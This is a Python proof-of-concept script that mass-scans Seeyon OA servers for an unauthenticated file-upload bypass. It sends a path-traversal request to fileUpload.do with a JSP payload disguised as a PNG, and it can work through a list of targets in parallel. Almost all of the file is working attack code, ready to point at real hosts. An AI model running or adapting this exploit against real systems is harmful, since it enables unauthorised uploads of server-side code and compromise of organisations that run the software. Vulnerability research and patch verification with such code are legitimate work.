import requests, argparse, time, sys

requests.packages.urllib3.disable_warnings()
from multiprocessing import Pool


def banner():
    test = """
     _______  ______  ___ 
    /__  /\ \/ / __ \/   |
      / /  \  / / / / /| |
     / /__ / / /_/ / ___ |
    /____//_/\____/_/  |_|
                      
"""
    print(test)


def poc(target):
    payload = '/seeyon/autoinstall.do/.%2e/.%2e/seeyon/fileUpload.do?method=processUpload'
    data = """
            --00content0boundary00
            Content-Disposition: form-data; name="type"
            --00content0boundary00
            Content-Disposition: form-data; name="extensions" png
            --00content0boundary00
            Content-Disposition: form-data; name="applicationCategory"
            --00content0boundary00
            Content-Disposition: form-data; name="destDirectory"
            --00content0boundary00
            Content-Disposition: form-data; name="destFilename"
            --00content0boundary00
            Content-Disposition: form-data; name="maxSize"
            --00content0boundary00
            Content-Disposition: form-data; name="isEncrypt"
            false
            --00content0boundary00
            Content-Disposition: form-data; name="file1"; filename="1.png" Content-Type: Content-Type: application/pdf
            <% out.println("hello");%>
            --00content0boundary00--
    """
    headers = {
        'Content-Type': 'multipart/form-data; boundary=00content0boundary00'
    }
    try:
        response = requests.post(target + payload, data=data, headers=headers, timeout=10, verify=False)
        if "fileurls=fileurls" in response.text:
            print(f"[+] {target} 存在致远 OA fileUpload.do 前台文件上传绕过漏洞")
        else:
            print(f"[-] {target} 不存在漏洞")
    except Exception as e:
        print(f"[-] {target} 可能存在问题")


def main():
    banner()
    parser = argparse.ArgumentParser(description=" 致远 OA fileUpload.do 前台文件上传绕过漏洞")
    parser.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parser.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(20)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\tpython3 {sys.argv[0]} -h or --help")


if __name__ == '__main__':
    main()